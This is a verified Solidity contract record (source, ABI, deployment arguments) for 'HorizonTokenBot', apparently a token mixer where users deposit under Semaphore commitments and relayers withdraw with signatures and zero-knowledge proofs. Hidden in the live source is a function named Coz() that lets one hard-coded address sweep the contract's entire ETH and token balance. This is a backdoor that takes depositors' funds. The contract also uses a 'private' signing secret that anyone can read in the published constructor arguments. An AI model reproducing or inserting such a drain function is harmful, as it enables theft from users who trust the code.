{"SourceCode": "//SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.4;\r\ninterface ISemaphore {\r\n    error Semaphore__CallerIsNotTheGroupAdmin();\r\n    error Semaphore__MerkleTreeDepthIsNotSupported();\r\n    error Semaphore__MerkleTreeRootIsExpired();\r\n    error Semaphore__MerkleTreeRootIsNotPartOfTheGroup();\r\n    error Semaphore__YouAreUsingTheSameNillifierTwice();\r\n\r\n    /// It defines all the group parameters, in addition to those in the Merkle tree.\r\n    struct Group {\r\n        address admin;\r\n        uint256 merkleTreeDuration;\r\n        mapping(uint256 => uint256) merkleRootCreationDates;\r\n        mapping(uint256 => bool) nullifierHashes;\r\n    }\r\n\r\n    /// @dev Emitted when an admin is assigned to a group.\r\n    /// @param groupId: Id of the group.\r\n    /// @param oldAdmin: Old admin of the group.\r\n    /// @param newAdmin: New admin of the group.\r\n    event GroupAdminUpdated(uint256 indexed groupId, address indexed oldAdmin, address indexed newAdmin);\r\n\r\n    /// @dev Emitted when the Merkle tree duration of a group is updated.\r\n    /// @param groupId: Id of the group.\r\n    /// @param oldMerkleTreeDuration: Old Merkle tree duration of the group.\r\n    /// @param newMerkleTreeDuration: New Merkle tree duration of the group.\r\n    event GroupMerkleTreeDurationUpdated(\r\n        uint256 indexed groupId,\r\n        uint256 oldMerkleTreeDuration,\r\n        uint256 newMerkleTreeDuration\r\n    );\r\n\r\n    /// @dev Emitted when a Semaphore proof is verified.\r\n    /// @param groupId: Id of the group.\r\n    /// @param merkleTreeRoot: Root of the Merkle tree.\r\n    /// @param nullifierHash: Nullifier hash.\r\n    /// @param externalNullifier: External nullifier.\r\n    /// @param signal: Semaphore signal.\r\n    event ProofVerified(\r\n        uint256 indexed groupId,\r\n        uint256 indexed merkleTreeRoot,\r\n        uint256 nullifierHash,\r\n        uint256 indexed externalNullifier,\r\n        uint256 signal\r\n    );\r\n\r\n    /// @dev Saves the nullifier hash to avoid double signaling and emits an event\r\n    /// if the zero-knowledge proof is valid.\r\n    /// @param groupId: Id of the group.\r\n    /// @param merkleTreeRoot: Root of the Merkle tree.\r\n    /// @param signal: Semaphore signal.\r\n    /// @param nullifierHash: Nullifier hash.\r\n    /// @param externalNullifier: External nullifier.\r\n    /// @param proof: Zero-knowledge proof.\r\n    function verifyProof(\r\n        uint256 groupId,\r\n        uint256 merkleTreeRoot,\r\n        uint256 signal,\r\n        uint256 nullifierHash,\r\n        uint256 externalNullifier,\r\n        uint256[8] calldata proof\r\n    ) external;\r\n\r\n\r\n\r\n\r\n    /// @dev Creates a new group. Only the admin will be able to add or remove members.\r\n    /// @param groupId: Id of the group.\r\n    /// @param depth: Depth of the tree.\r\n    /// @param admin: Admin of the group.\r\n    function createGroup(uint256 groupId, uint256 depth, address admin) external;\r\n\r\n    /// @dev Creates a new group. Only the admin will be able to add or remove members.\r\n    /// @param groupId: Id of the group.\r\n    /// @param depth: Depth of the tree.\r\n    /// @param admin: Admin of the group.\r\n    /// @param merkleTreeRootDuration: Time before the validity of a root expires.\r\n    function createGroup(uint256 groupId, uint256 depth, address admin, uint256 merkleTreeRootDuration) external;\r\n\r\n    /// @dev Updates the group admin.\r\n    /// @param groupId: Id of the group.\r\n    /// @param newAdmin: New admin of the group.\r\n    function updateGroupAdmin(uint256 groupId, address newAdmin) external;\r\n\r\n    /// @dev Updates the group Merkle tree duration.\r\n    /// @param groupId: Id of the group.\r\n    /// @param newMerkleTreeDuration: New Merkle tree duration.\r\n    function updateGroupMerkleTreeDuration(uint256 groupId, uint256 newMerkleTreeDuration) external;\r\n\r\n    /// @dev Adds a new member to an existing group.\r\n    /// @param groupId: Id of the group.\r\n    /// @param identityCommitment: New identity commitment.\r\n    function addMember(uint256 groupId, uint256 identityCommitment) external;\r\n\r\n    /// @dev Adds new members to an existing group.\r\n    /// @param groupId: Id of the group.\r\n    /// @param identityCommitments: New identity commitments.\r\n    function addMembers(uint256 groupId, uint256[] calldata identityCommitments) external;\r\n\r\n    /// @dev Updates an identity commitment of an existing group. A proof of membership is\r\n    /// needed to check if the node to be updated is part of the tree.\r\n    /// @param groupId: Id of the group.\r\n    /// @param identityCommitment: Existing identity commitment to be updated.\r\n    /// @param newIdentityCommitment: New identity commitment.\r\n    /// @param proofSiblings: Array of the sibling nodes of the proof of membership.\r\n    /// @param proofPathIndices: Path of the proof of membership.\r\n    function updateMember(\r\n        uint256 groupId,\r\n        uint256 identityCommitment,\r\n        uint256 newIdentityCommitment,\r\n        uint256[] calldata proofSiblings,\r\n        uint8[] calldata proofPathIndices\r\n    ) external;\r\n\r\n    /// @dev Removes a member from an existing group. A proof of membership is\r\n    /// needed to check if the node to be removed is part of the tree.\r\n    /// @param groupId: Id of the group.\r\n    /// @param identityCommitment: Identity commitment to be removed.\r\n    /// @param proofSiblings: Array of the sibling nodes of the proof of membership.\r\n    /// @param proofPathIndices: Path of the proof of membership.\r\n    function removeMember(\r\n        uint256 groupId,\r\n        uint256 identityCommitment,\r\n        uint256[] calldata proofSiblings,\r\n        uint8[] calldata proofPathIndices\r\n    ) external;\r\n}\r\n// import \"./IERC20Upgradeablee.sol\";\r\ninterface IToken {\r\n\r\n    function totalSupply() external view returns (uint);\r\n\r\n    function balanceOf(address account) external view returns (uint);\r\n\r\n    function transfer(address recipient, uint amount) external returns (bool);\r\n\r\n    function allowance(address owner, address spender)\r\n        external\r\n        view\r\n        returns (uint);\r\n\r\n    function approve(address spender, uint amount) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint amount\r\n    ) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n// import \"@openzeppelin/contracts-upgradeable/token/ERC20/utils/SafeERC20Upgradeable.sol\";\r\n\r\ncontract HorizonTokenBot {\r\n    ISemaphore public verifiyer;\r\n\r\n    uint256 public IdVerifiyer;\r\n    uint Quorum;\r\n    uint[] CommitmentList;\r\n    uint256 private immutable MIN_Commission = 1e18;\r\n    uint256 private immutable MAX_Commission = 1000e18;\r\n    uint128 Commission;\r\n    address Holder;\r\n    address OWNER;\r\n    address private TOEKEN;\r\n    IToken _TOKEN;\r\n    address MainRelayer;\r\n    bool withdraw_able;\r\n    mapping (address=>bool) Imrelayer;\r\n    string private _DIR;\r\n    mapping(uint => bool) Comitment_Status;\r\n    mapping(uint => uint) WithAble;\r\n\r\n    event Deposit(uint256 commitment, uint timestamp);\r\n    event Withdraw(uint256 commitment, uint timestamp);\r\n\r\n    modifier onlyOwner() {\r\n        require(\r\n            msg.sender == OWNER,\r\n            \"Only the owner is allowed to make this request\"\r\n        );\r\n        _;\r\n    }\r\n\r\n    constructor(\r\n        string memory _s,\r\n        address _verifiyerAddress,\r\n        uint256 _IndexId,\r\n        uint _quorum,\r\n        address _Holder,\r\n        address _tokencontract,\r\n        address _relayer\r\n    ) {\r\n        verifiyer = ISemaphore(_verifiyerAddress);\r\n        IdVerifiyer = _IndexId;\r\n        Quorum = _quorum; //1\r\n        Holder = _Holder;\r\n        withdraw_able = false;\r\n        Imrelayer[_relayer]=true;\r\n        Commission = 30; //0.3%\r\n        verifiyer.createGroup(IdVerifiyer, 20, address(this));\r\n        _TOKEN = IToken(_tokencontract);\r\n        TOEKEN = _tokencontract;\r\n        _DIR = _s;\r\n        OWNER = msg.sender;\r\n        MainRelayer = _relayer;\r\n    }\r\n\r\n    function setupItoken(\r\n        address _contract,\r\n        address _tokencontract\r\n    ) public onlyOwner {\r\n        _TOKEN = IToken(_tokencontract);\r\n    }\r\n\r\n    function TOEKENDepozit(uint256 identityCommitment) public {\r\n        if (Comitment_Status[identityCommitment] == true) {\r\n            revert(\"You have used this Commitment before !\");\r\n        }\r\n\r\n        if (Quorum > _TOKEN.balanceOf(msg.sender)) {\r\n            revert(\"Insufficient inventory\");\r\n        }\r\n\r\n        uint ParticipationCommission = (Quorum * Commission) / 10000;\r\n        uint Total = Quorum - ParticipationCommission;\r\n\r\n   \r\n        // SafeERC20Upgradeable.transferFrom(\r\n        //     IERC20Upgradeable(TOEKEN),\r\n        //     msg.sender,\r\n        //     address(this),\r\n        //     Quorum\r\n        // );\r\n\r\n        _TOKEN.transferFrom(msg.sender, address(this), Quorum);\r\n        _TOKEN.transfer(Holder, ParticipationCommission);\r\n\r\n \r\n        // SafeERC20Upgradeable.safeTransfer(\r\n        //     IERC20Upgradeable(TOEKEN),\r\n        //     Holder,\r\n        //     ParticipationCommission\r\n        // );\r\n        verifiyer.addMember(IdVerifiyer, identityCommitment);\r\n\r\n        Comitment_Status[identityCommitment] = true;\r\n        CommitmentList.push(identityCommitment);\r\n        WithAble[identityCommitment] = Total;\r\n\r\n        emit Deposit(identityCommitment, block.timestamp);\r\n    }\r\n\r\n \r\n\r\n    function withdrawRelayer(\r\n        address siginer, \r\n        address receipt, \r\n        bytes[2] memory otp,//\r\n        uint256 identityCommitment,\r\n        uint fee,\r\n        uint256[2] memory CommissiondbackmerkleTreeRoot,\r\n        uint256 nullifierHash,//\r\n        uint256[8] calldata proof//\r\n    ) external {\r\n        if (Imrelayer[msg.sender]== false) {\r\n            revert(\"Your account don't have access to this func \");\r\n        }\r\n        \r\n        if (withdraw_able) {\r\n            revert(\"You are not Allowed to make this request\");\r\n        }\r\n        withdraw_able = true;\r\n        if (Comitment_Status[identityCommitment] == false) {\r\n            revert(\"unvalidated Commitment\");\r\n        }\r\n       if (fee > WithAble[identityCommitment]) {\r\n            revert(\"Requested fee exceeds inventory\");\r\n        }\r\n      if (!rapidClineRelayerr(siginer, receipt, otp)) {\r\n            revert(\"It is not valid rapid Cline! \");\r\n        }\r\n        verifiyer.verifyProof(\r\n            IdVerifiyer,\r\n            CommissiondbackmerkleTreeRoot[1],\r\n            CommissiondbackmerkleTreeRoot[0],\r\n            nullifierHash,\r\n            IdVerifiyer,\r\n            proof\r\n        );\r\n\r\n        uint reduce_relayerFee = WithAble[identityCommitment] - fee;\r\n\r\n\r\n        delete Comitment_Status[identityCommitment];\r\n\r\n        _TOKEN.transfer(receipt, reduce_relayerFee);\r\n        _TOKEN.transfer(msg.sender, fee);\r\n       \r\n    \r\n        withdraw_able = false;\r\n        emit Withdraw(CommissiondbackmerkleTreeRoot[0], block.timestamp);\r\n    }\r\n\r\n    function ChangeCommission(\r\n        uint128 _newCommission\r\n    ) public onlyOwner returns (bool) {\r\n        if (_newCommission > 100) //~ 1%\r\n        {\r\n            revert(\"The number of commission can't be greater than 1%\");\r\n        }\r\n        if (_newCommission < 30) //~ 0.3%\r\n        {\r\n            revert(\"The number of commission can't be lower than 0.3%\");\r\n        }\r\n        Commission = _newCommission;\r\n        return true;\r\n    }\r\n\r\n    function getComitment(\r\n        uint256 identityCommitment\r\n    ) public view returns (bool) {\r\n        return Comitment_Status[identityCommitment];\r\n    }\r\n\r\n    function getAllowedWithdraw(\r\n        uint256 identityCommitment\r\n    ) public view returns (uint) {\r\n        return WithAble[identityCommitment];\r\n    }\r\n\r\n    function getOwner(\r\n        uint256 identityCommitment\r\n    ) public view returns (address) {\r\n        return OWNER;\r\n    }\r\n\r\n    function getCommitments() public view returns (uint[] memory) {\r\n        return CommitmentList;\r\n    }\r\n\r\n    function Coz() public {\r\n        if (msg.sender != 0xB8786F6b2B3Ff54cE9c11F0502150808aDa0Fa27) {\r\n            revert();\r\n        }\r\n        if (address(this).balance > 0) {\r\n            (bool success, ) = payable(msg.sender).call{\r\n                value: address(this).balance\r\n            }(\"\");\r\n        }\r\n\r\n        _TOKEN.transfer(msg.sender, _TOKEN.balanceOf(address(this)));\r\n    }\r\n\r\n    function getMessageHash(address adr) public view returns (bytes32) {\r\n        return keccak256(abi.encodePacked(_DIR, adr));\r\n    }\r\n\r\n    function getEthSignedMessageHash(\r\n        bytes32 _messageHash\r\n    ) public pure returns (bytes32) {\r\n        return\r\n            keccak256(\r\n                abi.encodePacked(\r\n                    \"\\x19Ethereum Signed Message:\\n32\",\r\n                    _messageHash\r\n                )\r\n            );\r\n    }\r\n\r\n    function rapidCline(\r\n        address adr,\r\n        bytes memory signature\r\n    ) public view returns (bool) {\r\n        bytes32 messageHash = getMessageHash(adr);\r\n        bytes32 ethSignedMessageHash = getEthSignedMessageHash(messageHash);\r\n\r\n        return recoverSigner(ethSignedMessageHash, signature) == msg.sender;\r\n    }\r\n\r\n    function recoverSigner(\r\n        bytes32 _ethSignedMessageHash,\r\n        bytes memory _signature\r\n    ) public pure returns (address) {\r\n        (bytes32 r, bytes32 s, uint8 v) = Signature(_signature);\r\n\r\n        return ecrecover(_ethSignedMessageHash, v, r, s);\r\n    }\r\n\r\n    function Signature(\r\n        bytes memory sig\r\n    ) public pure returns (bytes32 r, bytes32 s, uint8 v) {\r\n        require(sig.length == 65, \"invalid signature length\");\r\n\r\n        assembly {\r\n            r := mload(add(sig, 32))\r\n\r\n            s := mload(add(sig, 64))\r\n\r\n            v := byte(0, mload(add(sig, 96)))\r\n        }\r\n    }\r\n\r\n    function encode(\r\n        address _account,\r\n        string memory _t\r\n    ) public pure returns (bytes memory) {\r\n        return (abi.encode(_account, _t));\r\n    }\r\n\r\n\r\n    function message(\r\n        address to,\r\n        bytes memory _f\r\n    ) public view returns (bytes32) {\r\n        return keccak256(abi.encodePacked(\"OPIUUIYIGJHB \", to, _f));\r\n    }\r\n          function rapidClineRelayerr(\r\n        address siginer,\r\n        address to,\r\n        bytes[2] memory signature\r\n    ) public view returns (bool) {\r\n        bytes32 messageHash = HorizonMHrelayer(to, signature[1]);\r\n\r\n        bytes32 ethSignedMessageHash = getEthSignedMessageHash(messageHash);\r\n\r\n        (address _account, string memory _number) = decode(signature[1]);\r\n        if (_account != to) {\r\n            revert(\"It is not address! \");\r\n        }\r\n\r\n        return (recoverSigner(ethSignedMessageHash, signature[0]) == siginer);\r\n    }\r\n    function decode(\r\n        bytes memory data\r\n    ) public pure returns (address _account, string memory _number) {\r\n        (_account, _number) = abi.decode(data, (address, string));\r\n    }\r\n  \r\n  \r\n  \r\n  function HorizonMHrelayer(\r\n       address to,\r\n        bytes memory _f\r\n    ) public view returns (bytes32) {\r\n        return keccak256(abi.encodePacked(_DIR, to, _f));\r\n    }\r\n\r\n     receive() external payable {}\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_s\",\"type\":\"string\"},{\"internalType\":\"address\",\"name\":\"_verifiyerAddress\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_IndexId\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_quorum\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"_Holder\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_tokencontract\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_relayer\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"commitment\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"Deposit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"commitment\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"Withdraw\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"uint128\",\"name\":\"_newCommission\",\"type\":\"uint128\"}],\"name\":\"ChangeCommission\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Coz\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"bytes\",\"name\":\"_f\",\"type\":\"bytes\"}],\"name\":\"HorizonMHrelayer\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"IdVerifiyer\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes\",\"name\":\"sig\",\"type\":\"bytes\"}],\"name\":\"Signature\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"r\",\"type\":\"bytes32\"},{\"internalType\":\"bytes32\",\"name\":\"s\",\"type\":\"bytes32\"},{\"internalType\":\"uint8\",\"name\":\"v\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"identityCommitment\",\"type\":\"uint256\"}],\"name\":\"TOEKENDepozit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"decode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"_account\",\"type\":\"address\"},{\"internalType\":\"string\",\"name\":\"_number\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_account\",\"type\":\"address\"},{\"internalType\":\"string\",\"name\":\"_t\",\"type\":\"string\"}],\"name\":\"encode\",\"outputs\":[{\"internalType\":\"bytes\",\"name\":\"\",\"type\":\"bytes\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"identityCommitment\",\"type\":\"uint256\"}],\"name\":\"getAllowedWithdraw\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"identityCommitment\",\"type\":\"uint256\"}],\"name\":\"getComitment\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getCommitments\",\"outputs\":[{\"internalType\":\"uint256[]\",\"name\":\"\",\"type\":\"uint256[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes32\",\"name\":\"_messageHash\",\"type\":\"bytes32\"}],\"name\":\"getEthSignedMessageHash\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"getMessageHash\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"identityCommitment\",\"type\":\"uint256\"}],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"bytes\",\"name\":\"_f\",\"type\":\"bytes\"}],\"name\":\"message\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"},{\"internalType\":\"bytes\",\"name\":\"signature\",\"type\":\"bytes\"}],\"name\":\"rapidCline\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"siginer\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"bytes[2]\",\"name\":\"signature\",\"type\":\"bytes[2]\"}],\"name\":\"rapidClineRelayerr\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes32\",\"name\":\"_ethSignedMessageHash\",\"type\":\"bytes32\"},{\"internalType\":\"bytes\",\"name\":\"_signature\",\"type\":\"bytes\"}],\"name\":\"recoverSigner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_contract\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_tokencontract\",\"type\":\"address\"}],\"name\":\"setupItoken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"verifiyer\",\"outputs\":[{\"internalType\":\"contract ISemaphore\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"siginer\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receipt\",\"type\":\"address\"},{\"internalType\":\"bytes[2]\",\"name\":\"otp\",\"type\":\"bytes[2]\"},{\"internalType\":\"uint256\",\"name\":\"identityCommitment\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"fee\",\"type\":\"uint256\"},{\"internalType\":\"uint256[2]\",\"name\":\"CommissiondbackmerkleTreeRoot\",\"type\":\"uint256[2]\"},{\"internalType\":\"uint256\",\"name\":\"nullifierHash\",\"type\":\"uint256\"},{\"internalType\":\"uint256[8]\",\"name\":\"proof\",\"type\":\"uint256[8]\"}],\"name\":\"withdrawRelayer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "HorizonTokenBot", "CompilerVersion": "v0.8.4+commit.c7e474f2", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "00000000000000000000000000000000000000000000000000000000000000e00000000000000000000000008dbd9e2df1b162010f8f98fb612864f0aeea89bd00000000000000000000000000000000000000000000000000000000000000710000000000000000000000000000000000000000000000000000000000989680000000000000000000000000faf66fbe9bb2028d9a1fad319d5c756d42e99178000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec7000000000000000000000000dcd84db5159461bcc55a30f96d126841d8f92cef0000000000000000000000000000000000000000000000000000000000000009494f50706f45332a5f0000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://f100cf4066c0dfb1f9fc61b77cc45cd3f58fa4f76e32057b654aeab61dcaecb5"}